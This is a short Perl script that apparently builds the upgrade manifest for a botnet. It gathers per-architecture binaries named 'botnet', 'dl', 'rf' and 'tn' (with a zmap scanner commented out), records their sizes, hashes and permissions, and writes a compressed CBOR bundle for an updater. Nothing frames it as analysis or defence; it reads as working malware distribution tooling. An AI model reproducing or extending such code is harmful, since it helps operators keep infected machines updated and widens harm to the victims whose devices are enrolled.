# build !whisper data, for upgrades

use strict;
use Digest::SHA;
use CBOR::XS;
use Compress::LZF;

use bm::file;

my $version = shift;
my $arch    = shift;

my %whisper;

sub add
{
	my ($name, $path) = @_;

	#	warn "add $name ($path)\n";

	my $file = bm::file::load $path;
	$whisper{file}{$name} = [length $file->{data}, $file->{sha}, $file->{version}, $file->{perm}];
}

if ($version) {    # distinguish old-style vs. new-style updater
	$whisper{plversion} = $version;
	$whisper{bnversion} = $arch;

	#$whisper{minbnversion} = 24;
	$whisper{skipbn} = 1;    # never got around to make automated bn upgrades
} else {
	add pl => "dist/pl";
}

for (   [bn => "botnet"],

	#	[zm       => "zmap"],
	#	[dbclient => "dc"],
	[rf => "rf"],
	[dl => "dl"],
	[tn => "tn"],
	) {
	my ($bn, $botnet) = @$_;

	for my $path (<arch/*/$botnet>) {
		my $name = $path;
		$name =~ s%/\Q$botnet%/$bn%;
		$name =~ s%^arch/%%;
		add $name => $path;
	}
}

syswrite STDOUT, Compress::LZF::compress_best encode_cbor \%whisper;

